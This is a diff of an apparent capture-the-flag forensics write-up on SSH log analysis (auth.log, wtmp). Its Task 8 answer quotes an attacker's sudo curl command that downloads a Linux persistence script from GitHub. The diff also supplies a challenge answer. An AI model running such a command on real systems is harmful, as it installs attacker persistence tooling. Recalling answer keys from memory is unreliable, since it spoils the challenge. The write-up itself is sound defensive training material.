@@ -39,6 +39,7 @@ machine no.:
 - `systemd-logind`
 - before starting any of the questions: `auth.log` and `wtmp` summary 
 - an intro to sherlocks & things workth menioning for first timers like you don't have to do the tasks inorder
+- considering this is a very easy sherlock I want it to be as comprehensive as possible
 <div align="center">
 <br>
 <br>
@@ -148,7 +149,7 @@ What time did the attacker's first SSH session end according to auth.log?
 ## Task 8
 
 The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
-==Answer==
+==/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh==
 <div align="center">
 <br>
 <br>
